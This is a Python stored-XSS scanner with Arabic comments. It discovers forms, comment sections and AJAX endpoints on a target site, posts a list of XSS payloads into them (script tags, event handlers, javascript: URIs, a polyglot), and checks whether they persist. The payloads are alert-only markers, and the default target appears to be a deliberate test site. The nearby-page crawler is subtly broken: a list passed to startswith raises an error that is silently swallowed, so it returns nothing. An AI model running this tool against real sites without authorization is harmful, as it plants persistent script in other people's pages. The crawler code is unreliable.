"""
Stored XSS Scanner
==================
ماسح متقدم لاكتشاف ثغرات Stored/Persistent XSS

Features:
- Multi-page scanning
- Payload tracking
- Time-delayed verification
- Comment/Form injection detection
"""

import re
import time
import uuid
import hashlib
from typing import List, Dict, Optional
from bs4 import BeautifulSoup
import requests
from colorama import Fore, Style
from urllib.parse import urljoin


class StoredXSSScanner:
    """ماسح ثغرات Stored XSS"""
    
    def __init__(self, target_url: str, config: dict = None):
        self.target_url = target_url
        self.config = config or {}
        self.vulnerabilities = []
        self.session = requests.Session()
        self.unique_markers = {}  # لتتبع الـ payloads
        
        # إعدادات
        self.verify_pages = []  # صفحات التحقق
        self.scan_depth = config.get('scan_depth', 2)
        self.wait_time = config.get('wait_time', 5)  # انتظار بعد الحقن
    
    def _generate_unique_payload(self, base_payload: str) -> tuple:
        """توليد payload فريد للتتبع"""
        marker = str(uuid.uuid4())[:8]
        unique_payload = base_payload.replace('alert(1)', f'alert("{marker}")')
        return unique_payload, marker
    
    def _load_payloads(self) -> List[str]:
        """تحميل payloads للحقن"""
        return [
            # Basic XSS
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            
            # Comment-safe payloads
            '--><script>alert(1)</script><!--',
            '*/</script><script>alert(1)</script>/*',
            
            # Form payloads
            '<input onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            
            # Advanced
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            
            # Event handlers
            '<body onload=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            
            # Polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//',
        ]
    
    def scan(self, injection_points: List[Dict] = None) -> List[Dict]:
        """
        فحص Stored XSS
        
        Args:
            injection_points: نقاط الحقن (forms, comments, etc)
            
        Returns:
            قائمة الثغرات
        """
        print(f"\n{Fore.CYAN}[*] Starting Stored XSS Scan...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_url}{Style.RESET_ALL}")
        
        # 1. اكتشاف نقاط الحقن
        if not injection_points:
            injection_points = self._discover_injection_points()
        
        if not injection_points:
            print(f"{Fore.RED}[!] No injection points found{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.GREEN}[+] Found {len(injection_points)} injection points{Style.RESET_ALL}")
        
        # 2. اختبار كل نقطة حقن
        for point in injection_points:
            self._test_injection_point(point)
        
        # 3. النتائج
        self._print_results()
        return self.vulnerabilities
    
    def _discover_injection_points(self) -> List[Dict]:
        """اكتشاف نقاط الحقن (Forms, Comments, etc)"""
        print(f"{Fore.CYAN}[*] Discovering injection points...{Style.RESET_ALL}")
        
        injection_points = []
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 1. Forms
            forms = soup.find_all('form')
            for form in forms:
                point = self._analyze_form(form)
                if point:
                    injection_points.append(point)
            
            # 2. Comment sections
            comment_forms = soup.find_all(class_=re.compile('comment|reply|feedback', re.I))
            for comment in comment_forms:
                forms_in_comment = comment.find_all('form')
                for form in forms_in_comment:
                    point = self._analyze_form(form)
                    if point:
                        point['type'] = 'comment'
                        injection_points.append(point)
            
            # 3. Search for AJAX endpoints
            ajax_endpoints = self._find_ajax_endpoints(response.text)
            injection_points.extend(ajax_endpoints)
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error discovering injection points: {e}{Style.RESET_ALL}")
        
        return injection_points
    
    def _analyze_form(self, form) -> Optional[Dict]:
        """تحليل form لاستخراج المعلومات"""
        action = form.get('action', '')
        method = form.get('method', 'get').upper()
        
        # استخراج الحقول
        fields = {}
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            name = input_tag.get('name')
            if name:
                input_type = input_tag.get('type', 'text')
                fields[name] = {
                    'type': input_type,
                    'value': input_tag.get('value', '')
                }
        
        if not fields:
            return None
        
        # بناء URL كامل
        full_action = urljoin(self.target_url, action) if action else self.target_url
        
        return {
            'type': 'form',
            'url': full_action,
            'method': method,
            'fields': fields
        }
    
    def _find_ajax_endpoints(self, html: str) -> List[Dict]:
        """البحث عن AJAX endpoints في JavaScript"""
        endpoints = []
        
        # البحث عن $.ajax, fetch, XMLHttpRequest
        ajax_patterns = [
            r'\.ajax\(\s*{\s*url:\s*["\']([^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
        ]
        
        for pattern in ajax_patterns:
            matches = re.finditer(pattern, html)
            for match in matches:
                url = match.group(1)
                full_url = urljoin(self.target_url, url)
                endpoints.append({
                    'type': 'ajax',
                    'url': full_url,
                    'method': 'POST'
                })
        
        return endpoints
    
    def _test_injection_point(self, point: Dict):
        """اختبار نقطة حقن واحدة"""
        print(f"\n{Fore.CYAN}[*] Testing: {point['type']} at {point['url']}{Style.RESET_ALL}")
        
        payloads = self._load_payloads()
        
        for payload in payloads:
            # توليد payload فريد
            unique_payload, marker = self._generate_unique_payload(payload)
            
            # حقن الـ payload
            success = self._inject_payload(point, unique_payload, marker)
            
            if success:
                # الانتظار قليلاً للسماح بمعالجة البيانات
                time.sleep(self.wait_time)
                
                # التحقق من ظهور الـ payload
                if self._verify_stored_payload(marker):
                    vuln = {
                        'type': 'Stored XSS',
                        'severity': 'Critical',
                        'injection_point': point,
                        'payload': unique_payload,
                        'marker': marker,
                        'verified': True,
                        'verification_url': self.verify_pages[0] if self.verify_pages else point['url']
                    }
                    self.vulnerabilities.append(vuln)
                    
                    print(f"{Fore.RED}[!] STORED XSS FOUND!{Style.RESET_ALL}")
                    print(f"    Marker: {marker}")
                    print(f"    Payload: {unique_payload[:60]}...")
                    break
            
            time.sleep(self.config.get('delay', 1))
    
    def _inject_payload(self, point: Dict, payload: str, marker: str) -> bool:
        """حقن payload في نقطة معينة"""
        try:
            if point['type'] in ['form', 'comment']:
                return self._inject_via_form(point, payload)
            elif point['type'] == 'ajax':
                return self._inject_via_ajax(point, payload)
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Injection failed: {e}{Style.RESET_ALL}")
            return False
    
    def _inject_via_form(self, point: Dict, payload: str) -> bool:
        """حقن عبر Form"""
        # بناء البيانات
        data = {}
        for field_name, field_info in point['fields'].items():
            if field_info['type'] in ['text', 'textarea', 'email']:
                # حقن الـ payload في الحقول النصية
                data[field_name] = payload
            elif field_info['type'] == 'hidden':
                data[field_name] = field_info.get('value', '')
            else:
                data[field_name] = 'test'
        
        # إرسال الطلب
        if point['method'] == 'POST':
            response = self.session.post(
                point['url'],
                data=data,
                timeout=10,
                allow_redirects=True
            )
        else:
            response = self.session.get(
                point['url'],
                params=data,
                timeout=10,
                allow_redirects=True
            )
        
        return response.status_code in [200, 201, 302]
    
    def _inject_via_ajax(self, point: Dict, payload: str) -> bool:
        """حقن عبر AJAX endpoint"""
        data = {
            'comment': payload,
            'content': payload,
            'message': payload,
            'text': payload
        }
        
        response = self.session.post(
            point['url'],
            json=data,
            timeout=10,
            headers={'Content-Type': 'application/json'}
        )
        
        return response.status_code in [200, 201]
    
    def _verify_stored_payload(self, marker: str) -> bool:
        """التحقق من تخزين الـ payload"""
        # 1. التحقق في الصفحة الحالية
        if self._check_page_for_marker(self.target_url, marker):
            self.verify_pages.append(self.target_url)
            return True
        
        # 2. التحقق في صفحات أخرى (crawling محدود)
        pages_to_check = self._crawl_nearby_pages()
        
        for page in pages_to_check:
            if self._check_page_for_marker(page, marker):
                self.verify_pages.append(page)
                return True
        
        return False
    
    def _check_page_for_marker(self, url: str, marker: str) -> bool:
        """فحص صفحة للبحث عن marker"""
        try:
            response = self.session.get(url, timeout=10)
            return marker in response.text
        except:
            return False
    
    def _crawl_nearby_pages(self) -> List[str]:
        """استكشاف صفحات قريبة من الهدف"""
        pages = []
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # استخراج الروابط
            links = soup.find_all('a', href=True)
            
            for link in links[:20]:  # حد أقصى 20 رابط
                href = link['href']
                full_url = urljoin(self.target_url, href)
                
                # تصفية الروابط الخارجية
                if full_url.startswith(self.target_url.split('/')[0:3]):
                    pages.append(full_url)
        
        except:
            pass
        
        return list(set(pages))[:10]  # حد أقصى 10 صفحات
    
    def _print_results(self):
        """طباعة النتائج"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Stored XSS Scan Results{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.RED}Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Fore.RED}[{i}] STORED XSS VULNERABILITY{Style.RESET_ALL}")
                print(f"  Severity: {vuln['severity']}")
                print(f"  Injection URL: {vuln['injection_point']['url']}")
                print(f"  Verification URL: {vuln['verification_url']}")
                print(f"  Payload: {vuln['payload'][:60]}...")
        else:
            print(f"\n{Fore.GREEN}[+] No Stored XSS vulnerabilities found{Style.RESET_ALL}")


if __name__ == "__main__":
    scanner = StoredXSSScanner(
        target_url="http://testphp.vulnweb.com/guestbook.php",
        config={'delay': 1, 'wait_time': 3}
    )
    
    results = scanner.scan()
    print(f"\nFound {len(results)} Stored XSS vulnerabilities")